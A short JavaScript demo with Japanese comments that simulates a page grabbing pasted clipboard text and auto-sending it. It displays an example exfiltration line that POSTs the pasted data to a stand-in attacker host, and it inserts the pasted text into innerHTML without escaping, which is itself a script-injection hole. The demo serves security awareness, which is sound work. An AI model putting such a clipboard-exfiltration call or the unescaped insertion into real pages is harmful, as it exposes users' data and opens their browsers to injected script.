// autopaste.js - 自動ペースト＆即送信シミュレーション

window.addEventListener("DOMContentLoaded", () => {
  const autoInput = document.getElementById("autoInput");
  const autoLog = document.getElementById("autoLog");

  autoInput.addEventListener("paste", (event) => {
    const pasted = event.clipboardData.getData("text");

    // ログ表示（攻撃シミュレーション）
    autoLog.innerHTML = `
      ⚠️ ペースト内容が自動送信されました（シミュレーション）<br><br>
      📋 内容：<code>${pasted}</code><br><br>
      📤 実際の送信処理は行われていませんが、攻撃者は以下のようなコードで送信できます：<br>
      <code>fetch("https://attacker.site/", { method: "POST", body: pasted });</code>
    `;

    // 実際の送信は行わないが、シミュレーションとしてコンソール出力
    console.log("Auto-sent (simulated):", pasted);
  });
});
